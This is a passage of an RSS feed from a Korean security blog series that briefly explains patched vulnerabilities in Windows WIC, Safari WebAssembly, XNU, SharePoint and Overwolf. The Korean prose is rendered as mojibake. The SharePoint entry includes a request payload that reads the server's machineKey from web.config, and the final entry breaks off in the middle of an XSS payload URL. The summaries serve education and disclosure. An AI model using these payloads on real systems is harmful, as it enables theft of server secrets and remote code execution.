      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2137&q=&can=1&sort=-reported">Issue 2137: Windows: Out-of-bounds write in WindowsCodecsRaw!COlympusE300LoadRaw</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Windows 10 20H1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Windowsì—ì„œëŠ” Olympus E300ì˜ raw ì´ë¯¸ì§€ íŒŒì¼ì„ ì²˜ë¦¬í•  ë•Œ, <code>Windows Imaging Component (WIC)</code>ë¥¼ í†µí•´ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì´ ë•Œ <code>WindowsCodecsRaw.dll</code>ì˜ <code>COlympusE300LoadRaw::olympus_e300_load_raw()</code> í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. ì·¨ì•½ì ì´ ë°œìƒí•œ í•¨ìˆ˜ì˜ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> CLASS <span class="hljs-title">olympus_e300_load_raw</span><span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;  uchar  *data,  *dp;  ushort *pixel, *pix;  <span class="hljs-keyword">int</span> dwide, row, col;  dwide = raw_width * <span class="hljs-number">16</span> / <span class="hljs-number">10</span>;               <span class="hljs-comment">// (1)</span>  data = <span class="hljs-built_in">malloc</span> (dwide + raw_width*<span class="hljs-number">2</span>);  merror (data, <span class="hljs-string">&quot;olympus_e300_load_raw()&quot;</span>);  pixel = (ushort *) (data + dwide);  <span class="hljs-keyword">for</span> (row=<span class="hljs-number">0</span>; row &lt; height; row++) &#123;    fread (data, <span class="hljs-number">1</span>, dwide, ifp);    <span class="hljs-keyword">for</span> (dp=data, pix=pixel; pix &lt; pixel+raw_width; dp+=<span class="hljs-number">3</span>, pix+=<span class="hljs-number">2</span>) &#123;  <span class="hljs-comment">//  (2)</span>      <span class="hljs-keyword">if</span> (((dp-data) &amp; <span class="hljs-number">15</span>) == <span class="hljs-number">15</span>) dp++;      pix[<span class="hljs-number">0</span>] = dp[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span> | dp[<span class="hljs-number">0</span>];                                    <span class="hljs-comment">// (3)</span>      pix[<span class="hljs-number">1</span>] = dp[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">4</span> | dp[<span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">4</span>;                               <span class="hljs-comment">// (4)</span>    &#125;    <span class="hljs-keyword">for</span> (col=<span class="hljs-number">0</span>; col &lt; width; col++)      BAYER(row,col) = (pixel[col] &amp; <span class="hljs-number">0xfff</span>);  &#125;  <span class="hljs-built_in">free</span> (data);&#125;</code></pre><p>ë¨¼ì € (1)ì—ì„œ ë””ì½”ë”©ëœ ë°ì´í„°ë¥¼ ì €ì¥í•  ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•©ë‹ˆë‹¤. ë””ì½”ë”©ì€ ì—´ ë‹¨ìœ„ë¡œ ë””ì½”ë”©ì„ ì§„í–‰í•˜ëŠ”ë°, í•œ ì—´ì—ëŠ” <code>height</code>ë§Œí¼ì˜ í”½ì…€ì´ ì¡´ì¬í•˜ë©° í”½ì…€ì€ ê°ê° 2 bytesì˜ ë°ì´í„°ë¡œ ë””ì½”ë”© ë©ë‹ˆë‹¤. ê·¸ë¦¬ê³  (2)ì—ì„œë¶€í„° ì‹¤ì§ˆì ì¸ ë””ì½”ë”© ì‘ì—…ì´ ì§„í–‰ë©ë‹ˆë‹¤. ì¡°ê±´ë¬¸ì„ <code>pix &lt; pixel+raw_width</code>ë¡œ ì„¤ì •í•¨ìœ¼ë¡œì¨ ë””ì½”ë”© ê³¼ì •ì—ì„œ OOBê°€ ë°œìƒí•˜ì§€ ì•Šë„ë¡ ì‹ ê²½ì¼ì§€ë§Œ <code>raw_width</code>ê°€ <code>0xd79</code>ê°™ì´ í™€ìˆ˜ì¼ ê²½ìš°, í•œ í”½ì…€ ë‹¹ 2 bytes ì”© ë””ì½”ë“œí•˜ê¸° ë•Œë¬¸ì— í•´ë‹¹ loopì˜ ë§ˆì§€ë§‰ì—ì„œ (3)ì—ì„œëŠ” ë²„í¼ì˜ ë§ˆì§€ë§‰ì— ë°ì´í„°ë¥¼ ì“°ì§€ë§Œ (4)ì—ì„œ ë²„í¼ ë°–ì˜ ë©”ëª¨ë¦¬ ì˜ì—­ì— ë°ì´í„°ë¥¼ ì“°ê²Œ ë˜ì–´ 1 byte ì˜ OOB Writeê°€ ë°œìƒí•˜ê²Œ ë©ë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/WindowsCodecsRaw/">WindowsCodecsRaw</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/06/j0ker/2021-06-06/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-30734: Safari WebAssembly LLIntì—ì„œ ë°œê²¬ëœ Integer Overflow ì·¨ì•½ì </title>
      <link>https://hackyboiz.github.io/2021/06/05/fabu1ous/2021-06-05/</link>
      <guid>https://hackyboiz.github.io/2021/06/05/fabu1ous/2021-06-05/</guid>
      <pubDate>Sat, 05 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://blog.ret2.io/2021/06/02/pwn2own-2021-jsc-exploit/</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.ret2.io/2021/06/02/pwn2own-2021-jsc-exploit/">Exploitation of a JavaScriptCore WebAssembly Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Safari &lt;14.1.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Safariì˜ WebAssemblyëŠ” ì„¸ ë‹¨ê³„ë¥¼ ê±°ì³ ì‹¤í–‰ë˜ëŠ”ë° ê·¸ ì²« ë²ˆì§¸ ë‹¨ê³„ì¸ LLInt(Low Level Interpreter)ì— interger overflow ì·¨ì•½ì (CVE-2021-30734)ì´ ë°œìƒí•˜ì—¬ Safari 14.1.1 ë²„ì „ì—ì„œ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. LLIntì˜ ParserëŠ” í•¨ìˆ˜ì˜ ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ëŠ” ê³¼ì •ì—ì„œ <code>m_max_StackSize</code> í•„ë“œë¥¼ ì‚¬ìš©í•´ í•¨ìˆ˜ê°€ ì‚¬ìš©í•  ìŠ¤íƒì˜ ìµœëŒ€ í¬ê¸°ë¥¼ ì¶”ì í•©ë‹ˆë‹¤. íŒŒì‹±ì´ ëë‚˜ë©´ <code>m_max_StackSize</code> ê°’ì„ 16 byte alignmentë¡œ ë§ì¶”ê¸° ìœ„í•´ <code>LLIntGenerator::Finalize</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ ë°˜ì˜¬ë¦¼í•˜ê³  <code>m_numCalleeLocals</code> í•„ë“œì— ì €ì¥í•©ë‹ˆë‹¤. </p><p>ë§Œì•½ <code>m_max_StackSize</code> ê°’ì´ <code>0xffffffff</code>ì´ë¼ë©´ 16 byte alignmentë¥¼ ë§ì¶”ê¸° ìœ„í•´ ì˜¬ë¦¼ ê³„ì‚°ì„ í•˜ê²Œ ë˜ì–´ integer overflowê°€ ë°œìƒí•˜ê³  <code>m_numCalleeLocals</code>ì˜ ê°’ì´ <code>0x0</code>ìœ¼ë¡œ ì €ì¥ë©ë‹ˆë‹¤. í•¨ìˆ˜ê°€ ì‹¤ì œë¡œ ì‚¬ìš©í•˜ëŠ” ìŠ¤íƒì˜ í¬ê¸°ì™€ LLIntê°€ ì¶”ì í•˜ëŠ” í¬ê¸°ê°€ ì„œë¡œ ë‹¬ë¼ì§€ê²Œ ë˜ê³  ë©”ëª¨ë¦¬ ì˜¤ì—¼ìœ¼ë¡œ ì´ì–´ì§‘ë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/safari/">safari</category>
      
      <category domain="https://hackyboiz.github.io/tags/wasm/">wasm</category>
      
      <category domain="https://hackyboiz.github.io/tags/int-overflow/">int overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/05/fabu1ous/2021-06-05/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-30660: macOS ë° iOSì˜ ì»¤ë„ ë©”ëª¨ë¦¬ ìœ ì¶œ ì·¨ì•½ì </title>
      <link>https://hackyboiz.github.io/2021/06/04/l0ch/2021-06-04/</link>
      <guid>https://hackyboiz.github.io/2021/06/04/l0ch/2021-06-04/</guid>
      <pubDate>Fri, 04 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://alexplaskett.github.io/CVE-2021-30660/&quot;&gt;CVE-2021-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://alexplaskett.github.io/CVE-2021-30660/">CVE-2021-30660 - XNU Kernel Memory Disclosure</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li><a href="https://support.apple.com/en-us/HT212325">macOS 11.3 ì´ì „ release</a></li><li><a href="https://support.apple.com/en-us/HT212317">iOS 14.5 ì´ì „ release</a></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Appleì‚¬ì˜ macOS ë° iOSì˜ XNU ì‹œìŠ¤í…œì—ì„œ ì»¤ë„ ë©”ëª¨ë¦¬ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>XNUì˜ syscall <code>SYS_msgsnd_nocancel</code> ì˜ í•¸ë“¤ëŸ¬ì¸ <a href="https://opensource.apple.com/source/xnu/xnu-1504.7.4/bsd/kern/sysv_msg.c.auto.html">sysv_msg.c/msgrcv_nocancel()</a> ëŠ” ìœ ì € ê³µê°„ì˜ ë©”ì‹œì§€ í¬ê¸°ë¥¼ <code>msgsz</code>ë¡œ ë°›ìŠµë‹ˆë‹¤. ë§Œì•½ ìœ ì € ê³µê°„ì—ì„œ ìš”ì²­ëœ í¬ê¸°ê°€ ì´ˆê¸°ì— ì»¤ë„ì— ì „ì†¡ëœ í¬ê¸° <code>msghdrâ†’msg_ts</code>ë³´ë‹¤ í¬ë©´ ì•„ë˜ì™€ ê°™ì´ <code>msghdrâ†’msg_ts</code>ë¡œ ìë¦…ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (msgsz &gt; msghdr-&gt;msg_ts) &#123;msgsz = msghdr-&gt;msg_ts;&#125;</code></pre><p>ì´í›„ ì•„ë˜ì˜ ë°˜ë³µë¬¸ì„ ëŒë©° ì»¤ë„ <code>msgpool</code>ì˜ ë°ì´í„°ë¥¼ ìœ ì € ê³µê°„ìœ¼ë¡œ ë³µì‚¬í•©ë‹ˆë‹¤.</p><pre><code class="hljs c"><span class="hljs-number">1</span><span class="hljs-comment">// msg.h</span><span class="hljs-number">2</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MSGSSZ8<span class="hljs-comment">/* Each segment must be 2^N long */</span></span><span class="hljs-number">3</span><span class="hljs-number">4</span><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">msginit</span><span class="hljs-params">(__unused <span class="hljs-keyword">void</span> *dummy)</span></span>&#123;<span class="hljs-number">5</span><span class="hljs-keyword">if</span> (i != msginfo.msgssz) &#123;<span class="hljs-number">6</span><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;msginfo.msgssz=%d (0x%x) not a small power of 2; resetting to %d\\n&quot;</span>, msginfo.msgssz, msginfo.msgssz, MSGSSZ); <span class="hljs-number">7</span>msginfo.msgssz = MSGSSZ;<span class="hljs-number">8</span>&#125;<span class="hljs-number">9</span>...<span class="hljs-number">10</span><span class="hljs-number">11</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">msgsnd_nocancel</span><span class="hljs-params">(struct proc *p, struct msgsnd_nocancel_args *uap, <span class="hljs-keyword">int32_t</span> *retval)</span></span>&#123;<span class="hljs-number">12</span>...<span class="hljs-number">13</span><span class="hljs-keyword">for</span> (len = <span class="hljs-number">0</span>; len &lt; msgsz; len += msginfo.msgssz) &#123;<span class="hljs-number">14</span><span class="hljs-keyword">size_t</span> tlen;<span class="hljs-number">15</span><span class="hljs-comment">/* compare input (size_t) value against restrict (int) value */</span><span class="hljs-number">16</span><span class="hljs-keyword">if</span> (msgsz &gt; (<span class="hljs-keyword">size_t</span>)msginfo.msgssz) &#123;<span class="hljs-number">17</span>tlen = msginfo.msgssz;<span class="hljs-number">18</span>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-number">19</span>tlen = msgsz;<span class="hljs-number">20</span>&#125;<span class="hljs-number">21</span><span class="hljs-keyword">if</span> (next &lt;= <span class="hljs-number">-1</span>) &#123;<span class="hljs-number">22</span>panic(<span class="hljs-string">&quot;next too low #3&quot;</span>);<span class="hljs-number">23</span>&#125;<span class="hljs-number">24</span><span class="hljs-keyword">if</span> (next &gt;= msginfo.msgseg) &#123;<span class="hljs-number">25</span>panic(<span class="hljs-string">&quot;next out of range #3&quot;</span>);<span class="hljs-number">26</span>&#125;<span class="hljs-number">27</span>SYSV_MSG_SUBSYS_UNLOCK();<span class="hljs-number">28</span>eval = copyout(&amp;msgpool[next * msginfo.msgssz], user_msgp, tlen);<span class="hljs-number">29</span>...</code></pre><p>ë°˜ë³µë¬¸ì˜ ì¦ê°€ ê°’ì¸ <code>msginfo.msgssz</code>ëŠ” <code>msginit()</code>ì—ì„œ <code>#define MSGSSZ 8</code> ë¡œ ì„ ì–¸ëœ <code>MSGSSZ</code>ë¡œ ì´ˆê¸°í™”ë˜ì–´ íŠ¹ì • ì¡°ê±´ì„ ë§Œì¡±í•˜ë©´ <code>8 bytes</code> ë‹¨ìœ„ë¡œ ì»¤ë„ ë©”ëª¨ë¦¬ë¥¼ ìœ ì € ê³µê°„ì— ë³µì‚¬í•˜ëŠ”ë°, ì´ë•Œ ìš”ì²­ëœ í¬ê¸°ê°€ 8ì˜ ë°°ìˆ˜ê°€ ì•„ë‹ ê²½ìš° ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ <code>1~7 bytes</code> í¬ê¸°ì˜ ì»¤ë„ ë©”ëª¨ë¦¬ê°€ ìœ ì¶œë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><code>9 bytes</code> í¬ê¸°ì˜ <code>SYS_msgsnd_nocancel</code> syscallì„ ë³´ë‚¼ ê²½ìš° ì·¨ì•½ì ì€ ë‹¤ìŒê³¼ ê°™ì´ íŠ¸ë¦¬ê±° ë©ë‹ˆë‹¤.</p><ol><li><code>msghdrâ†’msg_ts</code>ì™€ <code>msgsz</code>ê°€ 9ë¡œ ì„¤ì •ë©ë‹ˆë‹¤.</li><li>line 16ì˜ ì¡°ê±´ë¬¸ì— ì˜í•´  <code>tlen</code>ì´ 8ì´ ë©ë‹ˆë‹¤.</li><li><code> 8 bytes</code> ë‹¨ìœ„ë¡œ ë³µì‚¬í•˜ëŠ” ë°˜ë³µë¬¸ì„ ë‘ ë²ˆ ìˆ˜í–‰í•©ë‹ˆë‹¤.</li><li><code>16 bytes</code>ì˜ ì»¤ë„ ë©”ëª¨ë¦¬ê°€ ìœ ì € ê³µê°„ìœ¼ë¡œ ë³µì‚¬ë˜ì–´ ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ <code>7 bytes</code> í¬ê¸°ì˜ ì»¤ë„ ë©”ëª¨ë¦¬ê°€ ìœ ì¶œë©ë‹ˆë‹¤.</li></ol>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/ios/">ios</category>
      
      <category domain="https://hackyboiz.github.io/tags/information-disclosure/">information disclosure</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/apple/">apple</category>
      
      <category domain="https://hackyboiz.github.io/tags/macos/">macos</category>
      
      <category domain="https://hackyboiz.github.io/tags/xnu/">xnu</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/04/l0ch/2021-06-04/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-31181: Microsoft SharePoint ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì </title>
      <link>https://hackyboiz.github.io/2021/06/03/idioth/2021-06-03/</link>
      <guid>https://hackyboiz.github.io/2021/06/03/idioth/2021-06-03/</guid>
      <pubDate>Thu, 03 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/6/1/cve-2021-31181-microsoft-sharepoint-webpart-interpretation-conflict-remote-code-execution-vulnerability">CVE-2021-31181: MICROSOFT SHAREPOINT WEBPART INTERPRETATION CONFLICT REMOTE CODE EXECUTION VULNERABILITY</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2021ë…„ 5ì›” 11ì¼ ë¦´ë¦¬ìŠ¤ ì´ì „ ë²„ì „ì˜ Microsoft SharePoint<ul><li>Foundation 2013 Service Pack 1</li><li>Server 2019</li><li>Enterprise Server 2016</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft SharePointì—ì„œ ì¸ì¦ëœ ì‚¬ìš©ìê°€ SharePointì˜ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì„œë¹„ìŠ¤ ê³„ì • contextì—ì„œ ì„ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì–´ 5ì›”ì— íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ <code>EditingPageParser.VerifyControlOnSafeList()</code> ë©”ì†Œë“œì—ì„œ ì‚¬ìš©ì ì…ë ¥ ê°’ ê²€ì¦ ë¯¸í¡ìœ¼ë¡œ ë°œìƒí•©ë‹ˆë‹¤. ì´ ë©”ì†Œë“œëŠ” unsafe controls ë¦¬ìŠ¤íŠ¸ì™€ ì‚¬ìš©ìì˜ ì…ë ¥ ê°’ì„ ë¹„êµí•˜ì—¬ í™•ì¸í•˜ë©° <code>web.config</code>ì— ì§€ì •ëœ <code>SafeControl</code>ì— ì˜í•´ ì•ˆì „í•œ ì»¨íŠ¸ë¡¤ì´ ì—†ëŠ” ê²½ìš° ì˜ˆì™¸ë¥¼ ë°œìƒì‹œí‚µë‹ˆë‹¤.</p><p>í•˜ì§€ë§Œ ê²€ì‚¬ë¥¼ ìš°íšŒí•˜ëŠ” ë°©ë²•ì´ ì¡´ì¬í•©ë‹ˆë‹¤. <code>EditingPageParser.ParseStringInternal()</code>ì€ ì‚¬ìš©ì ì…ë ¥ ê°’(<code>dscXml</code>)ì„ êµ¬ë¬¸ ë¶„ì„í•˜ê³  <code>hashtable</code>ì„ Register directive ì •ë³´ë¡œ ì±„ìš´ ë‹¤ìŒ ì„œë²„ ì»¨íŠ¸ë¡¤ì„ ë‚˜íƒ€ë‚´ëŠ” íƒœê·¸ë¡œ <code>hashtable2</code>ë¥¼ ì±„ì›ë‹ˆë‹¤. ê·¸ í›„ <code>hashtable2</code>ì˜ ê° ìš”ì†Œì— ëŒ€í•´ <code>Type</code> ê°ì²´ë¥¼ ìƒì„±í•˜ê³  <code>SafeControls</code>ì˜ allowed listì™€ ë¹„êµí•˜ì—¬ í™•ì¸í•©ë‹ˆë‹¤. í•˜ì§€ë§Œ <code>Type</code>ì„ í™•ì¸í•  ìˆ˜ ì—†ì„ ë•Œ ì„œë²„ ì»¨íŠ¸ë¡¤ íƒœê·¸ê°€ ë¬´ì‹œë©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ <code>WebPartPagesWebService.RenderWebPartForEdit</code> ì›¹ API ë©”ì†Œë“œë¡œ <code>/_vti_bin/webPartPages.asmx</code> ì—”ë“œí¬ì¸íŠ¸ë¥¼ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>aspx</code>ë¥¼ ì…ë ¥ ê°’ìœ¼ë¡œ ì‚¬ìš©í•˜ì—¬ <code>EditPageParser.VerifyControlOnSafeList</code>ë¥¼ ì‚¬ìš©í•´ í™•ì¸ í›„ unsafe elementê°€ ì—†ìœ¼ë©´ ë””ìì¸ ëª¨ë“œì—ì„œ ë§ˆí¬ì—…ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì´ë•Œ <code>RenderWebPartForEdit</code>ì˜ requestëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs dust"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@</span> <span class="hljs-attr">Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;WebPartPages&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;Microsoft.SharePoint.WebPartPage&quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;Microsoft.SharePoint, Version=16.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c&quot;</span> %&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">%@Register</span> <span class="hljs-attr">TagPrefix</span>=<span class="hljs-string">&quot;att&quot;</span> <span class="hljs-attr">Namespace</span>=<span class="hljs-string">&quot;System.Web.UI.WebControls &quot;</span> <span class="hljs-attr">Assembly</span>=<span class="hljs-string">&quot;System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&quot;</span>%&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">WebPartPages:XsltListFormWebPart</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;id01&quot;</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">ListDisplayName</span>=<span class="hljs-string">&quot;Documents&quot;</span> <span class="hljs-attr">WebId</span>=<span class="hljs-string">&quot;</span></span></span><span class="hljs-template-variable">&#123;6e7040c8-0338-4448-914d-a7061e0fc347&#125;</span><span class="xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">att:xmldatasource</span> <span class="hljs-attr">runat</span>=<span class="hljs-string">&quot;server&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;XDS1&quot;</span> </span></span><span class="xml">      XPath=&quot;/configuration/system.web/machineKey&quot; </span><span class="xml">      datafile=&quot;c:/inetpub/wwwroot/wss/VirtualDirectories/80/web.config&quot; /&gt; </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">DataSources</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;2.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span>          </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:output</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;xml&quot;</span> <span class="hljs-attr">indent</span>=<span class="hljs-string">&quot;yes&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span> &gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;<span class="hljs-name">xsl:copy-of</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;.&quot;</span>/&gt;</span> </span><span class="xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span> </span><span class="xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span> </span><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">xsl</span>&gt;</span> </span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">WebPartPages:XsltListFormWebPart</span>&gt;</span></span></code></pre><p>ë”°ë¼ì„œ <code>web.config</code>ì˜ machinekey sectionì„ ì‚¬ìš©í•˜ì—¬ ì„œë²„ì—ì„œ <code>ViewState</code>ê°€ deserialize ë  ë•Œ ì„ì˜ì˜ OS ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” <code>VIEWSTATE</code> íŒŒë¼ë¯¸í„°ë¥¼ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
      
      <category domain="https://hackyboiz.github.io/tags/sharepoint/">sharepoint</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/03/idioth/2021-06-03/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[í•˜ë£¨í•œì¤„] CVE-2021-33501: Overwolf 1-Click Remote Code Execution</title>
      <link>https://hackyboiz.github.io/2021/06/02/fabu1ous/2021-06-02/</link>
      <guid>https://hackyboiz.github.io/2021/06/02/fabu1ous/2021-06-02/</guid>
      <pubDate>Wed, 02 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://swordbytes.com/blog/security-advisory-overwolf-1-</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swordbytes.com/blog/security-advisory-overwolf-1-click-remote-code-execution-cve-2021-33501/">Overwolf 1-Click Remote Code Execution</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Overwolf Client 0.169.0.22</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>OverwolfëŠ” PC ê²Œì„ì„ ìœ„í•œ í™•ì¥ í”„ë¡œê·¸ë¨ì˜ ê°œë°œ í”„ë˜ì„ì›Œí¬ë¥¼ ì œê³µí•˜ê³  ìœ í†µí•˜ëŠ” í”Œë«í¼ì…ë‹ˆë‹¤. Overwolf Storeì˜ URL handlerì— Reflected Cross-Site Scripting(XSS)ì„ ì´ìš©í•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. </p><pre><code class="hljs url">overwolfstore:&#x2F;&#x2F;app&#x2F;apps&#x2F;&lt;img src&#x3D;x 